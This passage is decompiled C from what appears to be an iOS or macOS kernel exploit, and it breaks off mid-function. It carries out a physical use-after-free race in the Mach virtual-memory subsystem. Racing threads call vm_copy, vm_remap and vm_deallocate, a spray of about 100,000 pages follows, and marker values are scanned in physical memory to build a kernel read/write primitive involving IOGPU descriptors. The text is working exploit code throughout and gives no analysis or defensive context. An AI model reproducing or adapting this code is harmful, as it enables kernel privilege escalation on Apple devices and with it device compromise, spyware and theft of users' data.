  return result;
}

//----- (00000000000071AC) ----------------------------------------------------
__int64 __fastcall find_mem_region(__int64 result)
{
  __int64 v1; // x19
  __int128 v2[5]; // [xsp+0h] [xbp-90h] BYREF
  vm_size_t size; // [xsp+58h] [xbp-38h] BYREF
  vm_address_t address; // [xsp+60h] [xbp-30h] BYREF
  mach_msg_type_number_t infoCnt; // [xsp+68h] [xbp-28h] BYREF
  natural_t nesting_depth; // [xsp+6Ch] [xbp-24h] BYREF

  address = 0;
  if ( !*(uint64_t *)(result + 16) )
  {
    v1 = result;
    while ( 1 )
    {
      size = 0;
      memset(v2, 0, 76);
      infoCnt = 19;
      nesting_depth = 1;
      result = vm_region_recurse_64(
                 mach_task_self_,
                 &address,
                 &size,
                 &nesting_depth,
                 (vm_region_recurse_info_t)v2,
                 &infoCnt);
      if ( nesting_depth )
      {
        if ( !*(uint64_t *)((char *)v2 + 12) )
          break;
      }
      address += size;
      if ( *(uint64_t *)(v1 + 16) )
        return result;
    }
    *(uint64_t *)(v1 + 16) = address;
  }
  return result;
}

//----- (000000000000725C) ----------------------------------------------------
__int64 __fastcall alloc_krw_region_map(__int64 a1)
{
  __int64 result; // x0
  vm_address_t address; // [xsp+18h] [xbp-18h] BYREF

  vm_map(
    mach_task_self_,
    (vm_address_t *)(a1 + 32),
    (*(uint64_t *)(a1 + 1432) << 14) + 49152LL,
    0x1FFFFFFu,
    1,
    0,
    0,
    0,
    3,
    7,
    1u);
  address = *(uint64_t *)(a1 + 32);
  vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
  address = *(uint64_t *)(a1 + 32) + 0x4000LL;
  vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
  address = *(uint64_t *)(a1 + 32) + 0x8000LL;
  result = vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
  **(uint8_t **)(a1 + 32) = 65;
  return result;
}

//----- (0000000000007334) ----------------------------------------------------
__int64 __fastcall alloc_vm_page_array(__int64 a1)
{
  __int64 v2; // x21
  __int64 result; // x0
  vm_address_t address; // [xsp+8h] [xbp-28h] BYREF

  v2 = 0;
  *(uint64_t *)(a1 + 48) = malloc(0xC3500u);
  do
  {
    address = 0;
    result = vm_allocate(mach_task_self_, &address, 0x4000u, 1);
    *(uint64_t *)(*(uint64_t *)(a1 + 48) + v2) = address;
    v2 += 8;
  }
  while ( v2 != 800000 );
  return result;
}

//----- (00000000000073B8) ----------------------------------------------------
__int64 __fastcall allocate_two_buffers_for_something(uint64_t *a1)
{
  vm_size_t v2; // x2
  __int64 result; // x0
  unsigned __int64 v4; // x8
  unsigned __int64 v5; // x9
  __int64 v6; // x10
  vm_address_t address; // [xsp+8h] [xbp-18h] BYREF

  a1[137] = 0x400000;
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x400000u, 3);
  a1[135] = address;
  v2 = a1[137];
  address = 0;
  result = vm_allocate(mach_task_self_, &address, v2, 1);
  a1[136] = address;
  v4 = a1[137];
  if ( v4 )
  {
    v5 = 0;
    v6 = a1[135];
    do
    {
      *(uint8_t *)(v6 + v5) = 65;
      v5 += 0x4000LL;
    }
    while ( v5 < v4 );
  }
  return result;
}

//----- (0000000000007454) ----------------------------------------------------
__int64 __fastcall setup_krw_region_structure(uint64_t *a1)
{
  __int64 result; // x0
  uint8_t desc[0x100]; // [xsp+0h] [xbp-140h] BYREF
  vm_address_t address; // [xsp+108h] [xbp-38h] BYREF

  a1[140] = 0x28000LL * a1[179];
  address = 0;
  vm_allocate(mach_task_self_, &address, a1[140], 1);
  a1[138] = address;
  address = 0;
  result = vm_allocate(mach_task_self_, &address, a1[140] + 0x8000LL, 1);
  a1[139] = address;

  memset(desc, 0, sizeof(desc));
  memcpy(&desc[8], byte_42D30, 0x10);
  iogpu_desc_store32(desc, 40, 1);
  iogpu_desc_store32(desc, 112, 4);
  iogpu_desc_store32(desc, 124, 16893952);
  iogpu_desc_store64(desc, 152, -1LL);
  iogpu_desc_store32(desc, 172, 786560);
  if ( a1[140] )
  {
    for ( uint64_t offset = 0; offset < a1[140]; offset += sizeof(desc) )
      memcpy((void *)(a1[138] + offset), desc, sizeof(desc));
    for ( uint64_t offset = 0; offset < a1[140]; offset += 0x4000LL )
    {
      address = a1[139] + offset;
      vm_address_t fixedAddress = address;
      vm_allocate(mach_task_self_, &address, 0x4000u, 16386);
      result = vm_remap_inplace(fixedAddress, 0x4000u, 0);
    }
  }
  return result;
}
// 42D30: using guessed type __int128 xmmword_42D30;

//----- (0000000000007630) ----------------------------------------------------
__int64 __fastcall physmap_vmregion_init(uint64_t *a1)
{
  vm_address_t address; // [xsp+8h] [xbp-18h] BYREF

  address = 0;
  vm_allocate(mach_task_self_, &address, 0xC000u, 1);
  a1[158] = address;
  grow_vm_region_list(a1);
  find_mem_region((__int64)a1);
  alloc_krw_region_map((__int64)a1);
  alloc_vm_page_array((__int64)a1);
  allocate_two_buffers_for_something(a1);
  return setup_krw_region_structure(a1);
}

//----- (00000000000076B0) ----------------------------------------------------
void *__fastcall alloc_physmap_page_entry(uint64_t *a1)
{
  PhysmapSmallPageEntry *entry; // x19
  vm_address_t mappedPage; // x20
  vm_address_t address; // [xsp+8h] [xbp-28h] BYREF

  entry = calloc(1u, sizeof(*entry));
  address = 0;
  vm_allocate(mach_task_self_, &address, 0xC000u, 1);
  entry->mapping = address;
  while ( !(unsigned int)request_physmap_page(a1, (__int64)&entry->ports) )
    ;
  thread_switch(0, 2, 0);
  mach_port_deallocate(mach_task_self_, entry->ports.workerMemoryEntry);
  entry->ports.workerMemoryEntry = 0;
  mappedPage = entry->mapping;
  vm_remap_inplace(mappedPage, 0xC000u, 0);
  if ( query_vm_region_nesting(mappedPage).object_id != entry->ports.objectId )
  {
    vm_deallocate(mach_task_self_, mappedPage, 0xC000u);
    entry->mapping = 0;
    entry->failureStage = 1;
  }
  return entry;
}

//----- (0000000000007794) ----------------------------------------------------
void *__fastcall physmap_page_entry_alloc(uint64_t *a1, int a2)
{
  PhysmapPageEntry *entry; // x19
  __int64 v5; // x1
  vm_address_t v6; // x3
  __int64 v7; // x1
  vm_address_t v8; // x3
  __int64 v9; // x1
  vm_address_t v10; // x0
  vm_address_t v11; // x22
  __int64 v12; // x1
  __int64 v13; // x23
  vm_address_t v14; // x22
  __int64 v15; // x1
  vm_address_t v16; // x0
  vm_address_t v17; // x0
  vm_address_t v18; // x22
  __int64 v19; // x1
  __int64 v20; // x23
  __int64 v21; // x8
  vm_address_t v22; // x3
  __int64 v23; // x8
  vm_address_t v25; // x8
  vm_address_t v26; // x6
  vm_prot_t cur_protection[2]; // [xsp+20h] [xbp-40h] BYREF
  vm_address_t address; // [xsp+28h] [xbp-38h] BYREF

  entry = calloc(1u, sizeof(*entry));
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x18000u, 1);
  entry->firstWideMap = address;
  while ( !(unsigned int)request_physmap_page(a1, (__int64)&entry->ports[0]) )
    ;
  thread_switch(0, 2, 0);
  mach_port_deallocate(mach_task_self_, entry->ports[0].workerMemoryEntry);
  entry->ports[0].workerMemoryEntry = 0;
  *(uint8_t *)entry->firstWideMap = 65;
  if ( query_vm_region_nesting(entry->firstWideMap).object_id != entry->ports[0].objectId )
  {
    v23 = 1;
LABEL_23:
    entry->failureStage = v23;
    return entry;
  }
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x14000u, 1);
  v6 = address;
  entry->secondWideMap = address;
  vm_copy(mach_task_self_, entry->firstWideMap + 0x4000LL, 0x14000u, v6);
  while ( !(unsigned int)request_physmap_page(a1, (__int64)&entry->ports[1]) )
    ;
  thread_switch(0, 2, 0);
  mach_port_deallocate(mach_task_self_, entry->ports[1].workerMemoryEntry);
  entry->ports[1].workerMemoryEntry = 0;
  *(uint8_t *)(entry->secondWideMap + 0x10000LL) = 65;
  if ( query_vm_region_nesting(entry->secondWideMap).object_id != entry->ports[1].objectId )
  {
    v23 = 2;
    goto LABEL_23;
  }
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x10000u, 1);
  v8 = address;
  entry->thirdMap = address;
  vm_copy(mach_task_self_, entry->secondWideMap, 0x10000u, v8);
  while ( !(unsigned int)request_physmap_page(a1, (__int64)&entry->ports[2]) )
    ;
  thread_switch(0, 2, 0);
  mach_port_deallocate(mach_task_self_, entry->ports[2].workerMemoryEntry);
  entry->ports[2].workerMemoryEntry = 0;
  *(uint8_t *)(entry->thirdMap + 0x8000LL) = 65;
  if ( query_vm_region_nesting(entry->thirdMap).object_id != entry->ports[2].objectId )
  {
    v23 = 3;
    goto LABEL_23;
  }
  v10 = vm_remap_new_target(entry->thirdMap, 0x10000u, 0);
  entry->thirdRemap = v10;
  address = v10 + 0x4000;
  vm_allocate(mach_task_self_, &address, 0xC000u, 0x4000);
  vm_deallocate(mach_task_self_, entry->secondWideMap, 0x14000u);
  entry->secondWideMap = 0;
  vm_deallocate(mach_task_self_, entry->firstWideMap, 0x18000u);
  entry->firstWideMap = 0;
  thread_switch(0, 2, 0);
  vm_deallocate(mach_task_self_, entry->ports[0].mappedAddress, 0x4000u);
  entry->ports[0].mappedAddress = 0;
  entry->thirdRemapCopy = vm_remap_new_target(entry->thirdMap, 0x10000u, 1);
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x10000u, 1);
  entry->snapshotA = address;
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x10000u, 1);
  entry->snapshotB = address;
  vm_copy(mach_task_self_, entry->thirdRemapCopy, 0x10000u, entry->snapshotA);
  vm_copy(mach_task_self_, entry->thirdRemapCopy, 0x10000u, entry->snapshotB);
  vm_deallocate(mach_task_self_, entry->thirdMap, 0x10000u);
  entry->thirdMap = 0;
  v11 = entry->thirdRemapCopy + 0x8000LL;
  vm_protect(mach_task_self_, v11, 0x4000u, 0, 1);
  v13 = query_vm_region_nesting(v11).object_id;
  vm_protect(mach_task_self_, v11, 0x4000u, 0, 3);
  if ( v13 != entry->ports[0].objectId )
  {
    v23 = 4;
    goto LABEL_23;
  }
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x10000u, 1);
  v14 = address;
  vm_copy(mach_task_self_, address, 0x10000u, entry->thirdRemap);
  vm_deallocate(mach_task_self_, v14, 0x10000u);
  vm_deallocate(mach_task_self_, entry->thirdRemap + 0x4000LL, 0xC000u);
  address = 0;
  vm_allocate(mach_task_self_, &address, 0x10000u, 1);
  entry->stagingMap = address;
  thread_switch(0, 2, 0);
  vm_deallocate(mach_task_self_, entry->ports[1].mappedAddress, 0x4000u);
  entry->ports[1].mappedAddress = 0;
  *(uint8_t *)(entry->stagingMap + 0x4000LL) = 65;
  entry->stagingMirror = vm_remap_new_target(entry->stagingMap, 0x10000u, 0);
  if ( query_vm_region_nesting(entry->stagingMap).object_id != entry->ports[1].objectId )
  {
    v23 = 5;
    goto LABEL_23;
  }
  v16 = entry->snapshotA;
  entry->retainedSource = v16;
  entry->snapshotA = 0;
  entry->retainedSourceMirror = vm_remap_new_target(v16, 0x10000u, 0);
  if ( (a2 & 1) == 0 )
    *(uint8_t *)entry->retainedSource = 65;
  thread_switch(0, 2, 0);
  vm_deallocate(mach_task_self_, entry->snapshotB, 0x10000u);
  entry->snapshotB = 0;
  vm_deallocate(mach_task_self_, entry->ports[2].mappedAddress, 0x4000u);
  entry->ports[2].mappedAddress = 0;
  vm_deallocate(mach_task_self_, entry->stagingMirror, 0x10000u);
  entry->stagingMirror = 0;
  vm_deallocate(mach_task_self_, entry->stagingMap, 0x10000u);
  entry->stagingMap = 0;
  v17 = entry->thirdRemapCopy;
  entry->retainedObjectMap = v17;
  entry->thirdRemapCopy = 0;
  entry->retainedObjectMirror = vm_remap_new_target(v17, 0x10000u, 0);
  v18 = entry->retainedObjectMap;
  vm_protect(mach_task_self_, v18, 0x4000u, 0, 1);
  v20 = query_vm_region_nesting(v18).object_id;
  vm_protect(mach_task_self_, v18, 0x4000u, 0, 3);
  if ( v20 != entry->ports[1].objectId )
  {
    v23 = 6;
    goto LABEL_23;
  }
  v21 = entry->retainedSource;
  if ( a2 )
  {
    entry->tailRemap = vm_remap_new_target(v21 + 0x4000, 0xC000u, 1);
    address = 0;
    vm_allocate(mach_task_self_, &address, 0xC000u, 1);
    v22 = address;
    entry->tailCopy = address;
    vm_copy(mach_task_self_, entry->tailRemap, 0xC000u, v22);
  }
  else
  {
    vm_deallocate(mach_task_self_, v21 + 49152, 0x4000u);
    vm_deallocate(mach_task_self_, entry->retainedSourceMirror + 49152LL, 0x4000u);
    v25 = a1[158];
    if ( v25 )
    {
      v26 = entry->retainedSourceMirror;
      *(uint64_t *)cur_protection = 0;
      address = v25;
      vm_remap(
        mach_task_self_,
        &address,
        0xC000u,
        0,
        0x4000,
        mach_task_self_,
        v26,
        0,
        &cur_protection[1],
        cur_protection,
        1u);
      vm_deallocate(mach_task_self_, entry->retainedSourceMirror, 0xC000u);
      entry->retainedSourceMirror = a1[158];
      a1[158] = 0;
    }
  }
  return entry;
}
// 7840: variable 'v5' is possibly undefined
// 78D4: variable 'v7' is possibly undefined
// 795C: variable 'v9' is possibly undefined
// 7A94: variable 'v12' is possibly undefined
// 7B88: variable 'v15' is possibly undefined
// 7C58: variable 'v19' is possibly undefined

//----- (0000000000007DA4) ----------------------------------------------------
uint64_t *__fastcall fill_physmap_page_entries(uint64_t *a1, __int64 a2)
{
  PhysmapDualRootQueue *queue = (PhysmapDualRootQueue *)a2;
  uint64_t *result; // x0

  for ( uint64_t i = 0; i != 2; ++i )
  {
    while ( 1 )
    {
      result = alloc_physmap_page_entry(a1);
      PhysmapSmallPageEntry *entry = (PhysmapSmallPageEntry *)result;
      if ( !entry->failureStage )
        break;
      entry->next = queue->failedList;
      queue->failedList = entry;
      ++queue->failedCount;
    }
    queue->roots[i] = result;
  }
  return result;
}

//----- (0000000000007E08) ----------------------------------------------------
uint64_t *__fastcall dequeue_physmap_page_entry(uint64_t *a1, uint64_t *a2)
{
  uint64_t *v3; // x20
  PhysmapSingleRootQueue *queue = (PhysmapSingleRootQueue *)a2;
  int v5; // w1
  uint64_t *result; // x0

  v3 = a1;
  PhysmapSingleRootQueue *firstQueue = (PhysmapSingleRootQueue *)(a1 + 151);
  v5 = firstQueue == queue;
  while ( 1 )
  {
    result = physmap_page_entry_alloc(a1, v5);
    PhysmapPageEntry *entry = (PhysmapPageEntry *)result;
    if ( !entry->failureStage )
      break;
    v5 = firstQueue == queue;
    entry->next = queue->failedList;
    queue->failedList = entry;
    ++queue->failedCount;
    a1 = v3;
  }
  queue->root = result;
  if ( queue->failedCount )
  {
    uint64_t *v8 = (uint64_t *)&queue->failedList;
    do
      v8 = (uint64_t *)*v8;
    while ( v8 );
  }
  return result;
}

//----- (0000000000007E84) ----------------------------------------------------
uint64_t *__fastcall dequeue_multiple_physmap_entries(uint64_t *a1)
{

  IogpuPrivateCtx *ctx = (IogpuPrivateCtx *)a1;
  fill_physmap_page_entries(a1, (__int64)&ctx->copyQueues[0]);
  fill_physmap_page_entries(a1, (__int64)&ctx->copyQueues[1]);
  dequeue_physmap_page_entry(a1, (uint64_t *)&ctx->firstPageQueue);
  return dequeue_physmap_page_entry(a1, (uint64_t *)&ctx->secondPageQueue);
}
// 7ECC: variable 'vars8' is possibly undefined

//----- (0000000000007EDC) ----------------------------------------------------
__int64 __fastcall trigger_vm_copy_shared_mem(__int64 a1)
{
  atomic_store(1u, (unsigned __int8 *)(a1 + 1280));
  vm_copy(
    mach_task_self_,
    *(uint64_t *)(*(uint64_t *)(a1 + 1208) + 240LL),
    0xC000u,
    *(uint64_t *)(*(uint64_t *)(a1 + 1240) + 208LL));
  return 0;
}

//----- (0000000000007F28) ----------------------------------------------------
__int64 __fastcall thread_realtime_vm_copy(__int64 a1)
{
  __int64 i; // x21
  __int64 v3; // x23
  __int64 j; // x21
  __int64 v5; // x23

  setup_thread_policy();
  for ( i = 0; i != -16; i -= 8 )
  {
    v3 = *(uint64_t *)(a1 + 1136 + i);
    vm_deallocate(mach_task_self_, *(uint64_t *)(v3 + 24), 0x4000u);
    *(uint64_t *)(v3 + 24) = 0;
  }
  vm_copy(mach_task_self_, *(uint64_t *)(a1 + 1080), *(uint64_t *)(a1 + 1096), *(uint64_t *)(a1 + 1088));
  for ( j = 0; j != -16; j -= 8 )
  {
    v5 = *(uint64_t *)(a1 + 1176 + j);
    vm_deallocate(mach_task_self_, *(uint64_t *)(v5 + 24), 0x4000u);
    *(uint64_t *)(v5 + 24) = 0;
  }
  atomic_store(1u, (unsigned __int8 *)(a1 + 1296));
  vm_copy(mach_task_self_, *(uint64_t *)(*(uint64_t *)(a1 + 1240) + 208LL), 0xC000u, 0xFFFFFFFFFFFFFFFFLL);
  return 0;
}

//----- (0000000000007FF8) ----------------------------------------------------
__int64 __fastcall scan_physmap_for_region(__int64 a1, unsigned __int64 a2)
{
  __int64 v4; // x8
  unsigned __int64 *v5; // x25
  unsigned __int64 *v6; // x21
  __int64 v7; // x22
  __int64 v8; // x26
  __int64 v9; // x23
  unsigned __int64 v10; // x8
  __int64 v11; // x28
  unsigned __int64 v12; // x27
  __int64 result; // x0
  unsigned __int64 v14; // x25
  unsigned __int64 v15; // x26
  vm_address_t address; // [xsp+8h] [xbp-58h] BYREF

  v4 = *(uint64_t *)(a1 + 32);
  v5 = (unsigned __int64 *)(v4 + 0x4000);
  v6 = (unsigned __int64 *)(v4 + 0x8000);
  v7 = *(uint64_t *)(a1 + 1088);
  v8 = *(uint64_t *)(a1 + 1496);
  v9 = *(uint64_t *)(a1 + 1504);
  *(uint64_t *)(v8 + v7) = 0xAAAA1111AAAA1111LL;
  *(uint64_t *)(v9 + v7) = 0xAAAA1111AAAA1111LL;
  v10 = 0xBBBB2222BBBB2223LL;
  v11 = 200000;
  while ( 1 )
  {
    v12 = v10;
    address = (vm_address_t)v5;
    result = vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
    *v5 = v12;
    __dsb(0xAu);
    if ( v12 == *(uint64_t *)(v7 + v8) )
    {
      *(uint8_t *)(a1 + 40) = 1;
      goto LABEL_8;
    }
    if ( v12 == *(uint64_t *)(v7 + v9) )
      break;
    v10 = v12 + 1;
    if ( !--v11 )
      goto LABEL_8;
  }
  *(uint8_t *)(a1 + 41) = 1;
LABEL_8:
  if ( !*(uint8_t *)(a1 + 41) && a2 )
  {
    v14 = v12 + 1;
    v15 = 1;
    while ( 1 )
    {
      address = (vm_address_t)v6;
      result = vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
      *v6 = v14;
      __dsb(0xAu);
      if ( v14 == *(uint64_t *)(v7 + v9) )
        break;
      ++v15;
      ++v14;
      if ( v15 > a2 )
        return result;
    }
    *(uint8_t *)(a1 + 41) = 1;
  }
  return result;
}

//----- (000000000000814C) ----------------------------------------------------
__int64 __fastcall get_physmap_region_ptr(__int64 a1, int a2)
{
  unsigned __int64 *v4; // x21
  __int64 v5; // x22
  __int64 v6; // x8
  __int64 v7; // x23
  unsigned __int64 v8; // x24
  __int64 v9; // x25
  __int64 result; // x0
  vm_address_t address; // [xsp+8h] [xbp-48h] BYREF

  v4 = (unsigned __int64 *)(*(uint64_t *)(a1 + 32) + 0x4000LL);
  v5 = *(uint64_t *)(a1 + 1088);
  v6 = 1504;
  if ( a2 )
    v6 = 1496;
  v7 = *(uint64_t *)(a1 + v6);
  *(uint64_t *)(v7 + v5) = 0xAAAA1111AAAA1111LL;
  v8 = 0xBBBB2222BBBB2223LL;
  v9 = 200000;
  while ( 1 )
  {
    address = (vm_address_t)v4;
    result = vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
    *v4 = v8;
    if ( v8 == *(uint64_t *)(v5 + v7) )
      break;
    ++v8;
    if ( !--v9 )
      return result;
  }
  if ( a2 )
    *(uint8_t *)(a1 + 40) = 1;
  else
    *(uint8_t *)(a1 + 41) = 1;
  return result;
}

//----- (0000000000008228) ----------------------------------------------------
unsigned __int64 __fastcall run_physmap_worker_threads(__int64 a1)
{
  pthread_t *v2; // x20
  unsigned __int8 *v3; // x21
  void *(__cdecl *v4)(void *); // x0
  unsigned __int8 v5; // w8
  unsigned __int8 v6; // w8
  void *(__cdecl *v7)(void *); // x0
  unsigned __int8 v8; // w8
  unsigned __int8 v9; // w8
  __int64 v10; // x1
  __int64 v11; // x8
  char v12; // w10
  char v13; // w9
  __int64 v14; // x20
  char i; // w8
  char v16; // w21
  unsigned __int64 result; // x0

  v2 = &PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_A_OFFSET);
  v3 = &PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET);
  atomic_store(0, &PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET));
  v4 = (void *(__cdecl *)(void *))nullsub_1(trigger_vm_copy_shared_mem);
  if ( pthread_create(v2, 0, v4, (void *)a1) )
    __error();
  v5 = atomic_load(v3);
  if ( (v5 & 1) == 0 )
  {
    do
    {
      usleep(0x3E8u);
      v6 = atomic_load(&PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET));
    }
    while ( (v6 & 1) == 0 );
  }
  usleep(0x1388u);
  atomic_store(0, &PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET));
  v7 = (void *(__cdecl *)(void *))nullsub_1(thread_realtime_vm_copy);
  if ( pthread_create(&PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_B_OFFSET), 0, v7, (void *)a1) )
    __error();
  v8 = atomic_load(&PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET));
  if ( (v8 & 1) == 0 )
  {
    do
    {
      usleep(0x3E8u);
      v9 = atomic_load(&PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET));
    }
    while ( (v9 & 1) == 0 );
  }
  usleep(0x1388u);
  vm_region_nesting_result nesting = query_vm_region_nesting(PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_SHARED_COPY_BASE_OFFSET));
  v11 = 0;
  v12 = 1;
  while ( 1 )
  {
    v13 = v12;
    if ( nesting.object_id == *(uint64_t *)(*(uint64_t *)(a1 + 8 * v11 + PHYSMAP_CTX_REGION_A_LIST_OFFSET) + 16LL) )
      break;
    v12 = 0;
    v11 = 1;
    if ( (v13 & 1) == 0 )
      goto LABEL_14;
  }
  PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_A_INDEX_OFFSET) = v11;
LABEL_14:
  v14 = 0;
  for ( i = 1; ; i = 0 )
  {
    v16 = i;
    result = query_vm_region_nesting(*(uint64_t *)(*(uint64_t *)(a1 + 8 * v14 + PHYSMAP_CTX_REGION_B_LIST_OFFSET) + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET)).packed_info;
    if ( (uint32_t)result == 2 )
      break;
    v14 = 1;
    if ( (v16 & 1) == 0 )
      return result;
  }
  PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_B_INDEX_OFFSET) = v14;
  return result;
}
// 8324: variable 'v10' is possibly undefined
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000008384) ----------------------------------------------------
uintptr_t __fastcall physmap_madvise_free(__int64 a1, __int64 a2)
{
  int status; // w0

  status = madvise((void *)(*(uint64_t *)(a1 + 32) + 49152LL), a2 << 14, 3);
  if ( status )
    return (uintptr_t)__error();
  return 0;
}
//----- (00000000000083C8) ----------------------------------------------------
__int64 __fastcall puaf_vmregion_race_trigger(uint64_t *a1)
{
  vm_address_t v2; // x20
  __int64 v3; // x8
  __int64 v4; // x10
  __int64 v5; // x22
  __int64 v6; // x23
  __int64 i; // x20
  __int64 result; // x0
  vm_address_t address; // [xsp+8h] [xbp-38h] BYREF

  address = 0;
  vm_allocate(mach_task_self_, &address, 0xC000u, 1);
  v2 = address;
  v3 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_SHARED_COPY_BASE_OFFSET);
  v4 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RACE_SOURCE_B_OFFSET);
  *(uint8_t *)(PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RACE_SOURCE_A_OFFSET) + v3) = 65;
  *(uint8_t *)(v4 + v3) = 65;
  v5 = *(uint64_t *)((char *)a1 + PHYSMAP_CTX_REGION_A_LIST_OFFSET + 8 * PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_A_INDEX_OFFSET));
  vm_deallocate(mach_task_self_, *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET), 0xC000u);
  *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET) = 0;
  thread_switch(0, 2, 0);
  v6 = *(uint64_t *)((char *)a1 + PHYSMAP_CTX_REGION_B_LIST_OFFSET + 8 * PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_B_INDEX_OFFSET));
  vm_deallocate(mach_task_self_, *(uint64_t *)(v6 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET), 0xC000u);
  *(uint64_t *)(v6 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET) = 0;
  vm_remap_inplace(v2, 0xC000u, 0);
  query_vm_region_nesting(v2);
  *(uint64_t *)(*(uint64_t *)((char *)a1 + PHYSMAP_CTX_REGION_B_LIST_OFFSET + 8 * PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_B_INDEX_OFFSET)) + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET) = v2;
  scan_physmap_for_region((__int64)a1, PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_PAGE_WINDOW_COUNT_OFFSET));
  physmap_madvise_free((__int64)a1, PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_PAGE_WINDOW_COUNT_OFFSET) - 4LL);
  for ( i = 0; i != 800000; i += 8 )
    result = vm_remap_inplace(*(uint64_t *)(PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_SPRAY_PAGES_OFFSET) + i), 0x4000u, 0);
  return result;
}

//----- (00000000000084F8) ----------------------------------------------------
uintptr_t __fastcall puaf_vm_region_scan_1(__int64 a1)
{
  __int64 v2; // x9
  vm_address_t v3; // x21
  __int64 v4; // x21
  __int64 v5; // x21
  int status; // w0
  vm_address_t address; // [xsp+8h] [xbp-28h] BYREF

  v2 = *(uint64_t *)(a1 + 32);
  if ( *(uint8_t *)(a1 + 40) && *(uint8_t *)(a1 + 41) )
  {
    v3 = v2 + 0x8000;
    address = v2 + 0x4000;
    vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
    address = v3;
  }
  else
  {
    address = v2 + 0x4000;
  }
  vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
  v4 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RESTORE_ENTRY_B_OFFSET);
  vm_deallocate(mach_task_self_, *(uint64_t *)(v4 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET), 0x4000u);
  *(uint64_t *)(v4 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET) = 0;
  if ( pthread_join(PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_B_OFFSET), 0) )
    __error();
  PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_B_OFFSET) = 0;
  v5 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RESTORE_ENTRY_A_OFFSET);
  vm_deallocate(mach_task_self_, *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET), 0x4000u);
  *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET) = 0;
  status = pthread_join(PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_A_OFFSET), 0);
  if ( status )
    return (uintptr_t)__error();
  PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_A_OFFSET) = 0;
  return 0;
}

//----- (00000000000085E4) ----------------------------------------------------
void __fastcall validate_physmap_range_2(__int64 a1)
{
  int v2; // w8
  __int64 v3; // x22
  __int64 v4; // x23
  __int64 v5; // x25
  vm_address_t v6; // x20
  __int64 v7; // x1
  __int64 v8; // x8
  int (__cdecl *v9)(const void *, const void *); // x0

  v2 = *(unsigned __int8 *)(a1 + 40);
  if ( *(uint8_t *)(a1 + 40) && *(uint8_t *)(a1 + 41) )
  {
    *(uint16_t *)(a1 + 40) = 0;
    scan_physmap_for_region(a1, *(uint64_t *)(a1 + 1432));
  }
  else
  {
    *(uint16_t *)(a1 + 40) = 0;
    get_physmap_region_ptr(a1, v2 != 0);
  }
  vm_copy(mach_task_self_, *(uint64_t *)(a1 + 1104), *(uint64_t *)(a1 + 1120), *(uint64_t *)(a1 + 1112));
  v3 = 0;
  v4 = 0;
  v5 = 0;
  do
  {
    v6 = *(uint64_t *)(*(uint64_t *)(a1 + 48) + 8 * v5);
    vm_region_nesting_result nesting = query_vm_region_nesting(v6);
    if ( nesting.packed_info >> 32 )
    {
      vm_deallocate(mach_task_self_, v6, 0x4000u);
      ++v5;
    }
    else
    {
      if ( !v3 )
        v3 = v5 + 1;
      ++v5;
      v8 = a1 + 16 * v4;
      *(uint64_t *)(v8 + 56) = v6;
      *(uint64_t *)(v8 + 64) = nesting.object_id;
      ++v4;
    }
  }
  while ( v5 != 100000 );
